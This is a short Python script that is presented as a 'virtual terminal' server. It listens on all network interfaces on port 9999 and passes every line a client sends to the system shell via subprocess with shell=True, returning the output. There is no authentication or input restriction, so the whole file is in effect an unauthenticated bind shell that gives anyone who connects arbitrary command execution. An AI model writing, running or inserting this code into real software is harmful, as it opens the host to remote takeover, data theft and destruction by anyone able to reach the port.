import os
import subprocess
import socketserver

class TerminalHandler(socketserver.StreamRequestHandler):
    def handle(self):
        self.intro()
        while True:
            try:
                data = self.rfile.readline().strip()
                if not data:
                    break
                result = self.execute_command(data)
                self.send_result(result)
            except Exception as e:
                self.send_error(str(e))

    def intro(self):
        self.wfile.write(b"Welcome to the virtual terminal!\n")

    def execute_command(self, command):
        output = subprocess.check_output(command, shell=True)
        return output

    def send_result(self, result):
        self.wfile.write(result)

    def send_error(self, error):
        self.wfile.write(b"Error: " + error.encode() + b"\n")

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 9999
    server = socketserver.ThreadingTCPServer((HOST, PORT), TerminalHandler)
    server.serve_forever()
